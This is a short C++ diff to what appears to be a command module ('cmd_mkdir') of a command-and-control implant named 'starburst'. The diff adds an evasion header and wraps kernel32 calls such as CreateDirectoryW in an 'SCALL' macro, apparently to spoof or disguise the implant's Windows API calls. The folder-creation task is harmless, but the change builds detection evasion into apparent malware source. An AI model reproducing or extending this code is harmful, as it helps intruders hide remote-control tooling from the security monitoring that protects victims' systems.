@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_MKDIR
 
@@ -28,9 +29,9 @@ auto declfn starburst::cmd_mkdir(
     memory::copy( path_buf, path, copy_len );
 
     wchar_t wpath[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path_buf, -1, wpath, 520 );
 
-    if ( inst.kernel32.CreateDirectoryW( wpath, nullptr ) ) {
+    if ( SCALL( inst, kernel32.CreateDirectoryW, wpath, nullptr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
             symbol<char*>( const_cast<char*>( "directory created" ) ) );
     } else {
